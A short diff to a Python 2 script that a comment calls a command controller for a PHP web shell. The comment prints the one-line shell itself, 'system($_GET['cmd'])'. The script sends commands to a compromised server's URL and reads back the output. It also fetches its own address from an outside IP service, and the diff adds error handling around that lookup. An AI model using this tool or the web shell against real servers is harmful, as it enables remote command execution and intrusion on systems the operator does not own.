@@ -3,6 +3,7 @@
 # Command controller for <?php system($_GET['cmd']); ?>
 
 from sys import argv
+import urllib2
 from urllib2 import urlopen
 from subprocess import Popen
 import readline
@@ -16,7 +17,10 @@ class Commander(object):
 
     def ServerInfo(self):
         self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
-        local_ip = (urlopen('http://85.214.27.38/show_my_ip').readlines())[0].split(':')[1].strip()
+        try:
+            local_ip = (urlopen('http://85.214.27.38/show_my_ip').readlines())[0].split(':')[1].strip()
+        except urllib2.URLError:
+            local_ip = 'Unknown'
         available_commands = ['exit', 'clear', 'history', 'info']
         self.info = \
         '''\033[92m
